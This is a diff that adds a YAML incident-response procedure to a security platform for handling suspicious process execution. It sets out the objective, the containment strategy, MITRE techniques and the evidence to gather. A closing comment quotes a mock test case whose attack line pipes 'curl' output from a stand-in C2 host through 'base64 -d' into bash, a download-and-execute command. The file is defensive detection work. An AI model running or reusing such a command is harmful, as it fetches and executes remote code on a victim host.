@@ -1,0 +1,42 @@
+id: PROC-SP-001
+code: SUSPICIOUS_PROCESS_EXECUTION
+name: Suspicious Process Execution Response Procedure
+version: "1.0"
+status: ACTIVE
+playbookId: PB-STC-001
+# Runtime counterpart in the database: playbooks.code = PB-SUSPICIOUS-PROCESS (prisma/seeds/playbook.seed.ts).
+dbPlaybook: PB-SUSPICIOUS-PROCESS
+
+objective: >
+  Stop suspicious execution and contain the affected endpoint when compromise risk is confirmed.
+
+strategy: >
+  Confirm the process is malicious, stop it and block its binary, check child processes and persistence, and
+  isolate the endpoint only when active compromise or propagation risk is evidenced.
+
+
+appliesWhen:
+  incidentTypes: [SUSPICIOUS_PROCESS_EXECUTION]
+  mitreTechniques: [T1059.004, T1059.003, T1218]
+  description: >
+    A process runs from an unusual location (/tmp, user-writable or hidden
+    paths), under an unexpected account, with a suspicious parent or command
+    line (download-and-execute, encoded payloads, LOLBins).
+
+primaryEvidence:
+  - "Process creation / audit event (path, hash, command line)"
+  - "Parent process chain"
+  - "Executing user / service account"
+  - "Network connections of the process"
+  - "File creation time and origin"
+
+references:
+  stepsFile: steps.yaml
+  decisionsFile: decisions.yaml
+  containmentFile: containment.yaml
+  verificationFile: verification.yaml
+
+# Worked example this procedure was written against (TC-08, resources/mock-attacks-tc/TC-08-suspicious-process.json):
+#   TC-08: auditd on WEB-01 - /tmp/.cache/kworkerd executed as www-data,
+#   started from 'curl -s http://vigix-mock-c2.net/x | base64 -d | bash';
+#   Wazuh rule 100330.
